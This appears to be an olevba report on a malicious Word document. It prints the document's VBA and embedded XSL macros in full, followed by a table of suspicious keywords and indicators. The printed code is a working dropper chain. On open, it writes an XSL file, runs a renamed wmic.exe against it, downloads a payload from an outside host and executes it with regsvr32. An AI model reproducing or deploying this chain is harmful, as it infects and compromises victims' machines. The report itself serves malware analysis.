olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.Alien.gen-d93c8dc6106fb0c3fac4311438a65089b6b52d84e44ef27be98693f0cc426300
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO frm.frm 
in file: word/vbaProject.bin - OLE stream: 'VBA/frm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO aKBSsQ.bas 
in file: word/vbaProject.bin - OLE stream: 'VBA/aKBSsQ'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function aRlMyx(aZl47Q)
With ActiveDocument
aRlMyx = .BuiltInDocumentProperties(aZl47Q)
End With
End Function
Sub AutoOpen()
a6Ymt5
End Sub
-------------------------------------------------------------------------------
VBA MACRO aFYG5.bas 
in file: word/vbaProject.bin - OLE stream: 'VBA/aFYG5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function aNUI1(aoPyB)
End Function
Sub a6Ymt5()
Dim amE2ak As String
amE2ak = Chr(34)
aQV9p = frm.textbox1.text
aMSIO = frm.textbox2.text
a9Dz5t = aMSIO & "\m1.xsl"
aXo4vp = aMSIO & "\m1.com"
a9CORa = frm.textbox3.text
aix4p a9Dz5t, aQV9p
FileCopy a9CORa, aXo4vp
Set adFWA = CreateObject("wscript.shell")
adFWA.run aXo4vp & aRlMyx("comments") & amE2ak & a9Dz5t & amE2ak
End Sub
Sub aix4p(aUCoc, aQV9p)
Open aUCoc For Output As #1
Print #1, aQV9p
Close #1
End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: 'frm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<?xml version='1.0'?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="https://microsoft.com/xxx">
	<msxsl:script language="VBScript" implements-prefix="user">
	<![CDATA[
		Function aHfna()

			Set xmlhttp = CreateObject("msxml2.xmlhttp")
			xmlhttp.open "GET", "http://4buzz8.com/assets/e3eae3840b8fa080c8f229058/dc006fcd34/efd7bf4ffb93fb636ff34d8/540f3d8/d483b51/lxgo13?bqx=349a68d&pnzw=ff6ce3f6dd1&gfzoy=b0af780", false
			xmlhttp.send

			If xmlhttp.Status = 200 Then
				Set stream = CreateObject("adodb.stream")
				stream.Open
				stream.Type = 1 
				stream.Write xmlhttp.ResponseBody
				stream.Position = 0
				stream.SaveToFile "c:\programdata\46981.jpg", 2
				stream.Close
			End if

		End Function
	]]>
	</msxsl:script>
	<msxsl:script language="VBScript" implements-prefix="user">
	<![CDATA[

	]]>
	</msxsl:script>
	<msxsl:script language="VBScript" implements-prefix="user">
	<![CDATA[
		Function aqKFp(aXzmPQ, aX8bv, ajlmq)

			Call aHfna

			Set arJXs = CreateObject("wscript.shell")
			With arJXs
				.exec "regsvr32 c:\programdata\46981.jpg"
			End With

			aqKFp = 1

		End Function
	]]>
	</msxsl:script>
<xsl:template match="/">
<xsl:value-of select="user:aqKFp('', '', '')"/>
</xsl:template>
</xsl:stylesheet>

-------------------------------------------------------------------------------
VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: 'frm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c:\programdata
-------------------------------------------------------------------------------
VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: 'frm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c:\windows\system32\wbem\wmic.exe
-------------------------------------------------------------------------------
VBA FORM Variable "b'textbox1'" IN 'word/vbaProject.bin' - OLE stream: 'frm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'<?xml version=\'1.0\'?>\r\n<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="https://microsoft.com/xxx">\r\n\t<msxsl:script language="VBScript" implements-prefix="user">\r\n\t<![CDATA[\r\n\t\tFunction aHfna()\r\n\r\n\t\t\tSet xmlhttp = CreateObject("msxml2.xmlhttp")\r\n\t\t\txmlhttp.open "GET", "http://4buzz8.com/assets/e3eae3840b8fa080c8f229058/dc006fcd34/efd7bf4ffb93fb636ff34d8/540f3d8/d483b51/lxgo13?bqx=349a68d&pnzw=ff6ce3f6dd1&gfzoy=b0af780", false\r\n\t\t\txmlhttp.send\r\n\r\n\t\t\tIf xmlhttp.Status = 200 Then\r\n\t\t\t\tSet stream = CreateObject("adodb.stream")\r\n\t\t\t\tstream.Open\r\n\t\t\t\tstream.Type = 1 \r\n\t\t\t\tstream.Write xmlhttp.ResponseBody\r\n\t\t\t\tstream.Position = 0\r\n\t\t\t\tstream.SaveToFile "c:\\programdata\\46981.jpg", 2\r\n\t\t\t\tstream.Close\r\n\t\t\tEnd if\r\n\r\n\t\tEnd Function\r\n\t]]>\r\n\t</msxsl:script>\r\n\t<msxsl:script language="VBScript" implements-prefix="user">\r\n\t<![CDATA[\r\n\r\n\t]]>\r\n\t</msxsl:script>\r\n\t<msxsl:script language="VBScript" implements-prefix="user">\r\n\t<![CDATA[\r\n\t\tFunction aqKFp(aXzmPQ, aX8bv, ajlmq)\r\n\r\n\t\t\tCall aHfna\r\n\r\n\t\t\tSet arJXs = CreateObject("wscript.shell")\r\n\t\t\tWith arJXs\r\n\t\t\t\t.exec "regsvr32 c:\\programdata\\46981.jpg"\r\n\t\t\tEnd With\r\n\r\n\t\t\taqKFp = 1\r\n\r\n\t\tEnd Function\r\n\t]]>\r\n\t</msxsl:script>\r\n<xsl:template match="/">\r\n<xsl:value-of select="user:aqKFp(\'\', \'\', \'\')"/>\r\n</xsl:template>\r\n</xsl:stylesheet>\r\n'
-------------------------------------------------------------------------------
VBA FORM Variable "b'textbox2'" IN 'word/vbaProject.bin' - OLE stream: 'frm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'c:\\programdata'
-------------------------------------------------------------------------------
VBA FORM Variable "b'textbox3'" IN 'word/vbaProject.bin' - OLE stream: 'frm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'c:\\windows\\system32\\wbem\\wmic.exe'
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|adodb.stream        |May create a text file                       |
|Suspicious|SaveToFile          |May create a text file                       |
|Suspicious|shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|wscript.shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|msxml2.xmlhttp      |May download files from the Internet         |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|exec                |May run an executable file or a system       |
|          |                    |command using Excel 4 Macros (XLM/XLF)       |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.w3.org/19|URL                                          |
|          |99/XSL/Transform    |                                             |
|IOC       |https://microsoft.co|URL                                          |
|          |m/xxx               |                                             |
|IOC       |http://4buzz8.com/as|URL                                          |
|          |sets/e3eae3840b8fa08|                                             |
|          |0c8f229058/dc006fcd3|                                             |
|          |4/efd7bf4ffb93fb636f|                                             |
|          |f34d8/540f3d8/d483b5|                                             |
|          |1/lxgo13?bqx=349a68d|                                             |
|          |&pnzw=ff6ce3f6dd1&gf|                                             |
|          |zoy=b0af780         |                                             |
|IOC       |wmic.exe            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

